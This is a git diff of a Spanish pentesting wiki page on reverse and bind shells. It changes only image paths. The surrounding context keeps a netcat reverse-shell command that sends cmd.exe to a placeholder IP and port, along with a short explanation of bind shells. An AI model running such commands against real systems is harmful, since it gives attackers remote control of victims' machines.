@@ -4,7 +4,7 @@
 
 ### Reverse Shell
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>
 
 #### Atacante Linux
 
@@ -40,7 +40,7 @@ nc.exe –e cmd.exe <IP> <Port>
 
 En algunos proyectos donde no puedas establecer un servidor de escucha por que te encuentres por NAT o por Firewall, a veces es conveniente de que la máquina victima esté en modo escucha ofreciendo la shell, a esto se le llama <mark style="color:green;">**Bind shell**</mark> o <mark style="color:green;">**shell directa.**</mark>
 
-<figure><img src="../../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>
 
 #### Atacante Linux
 
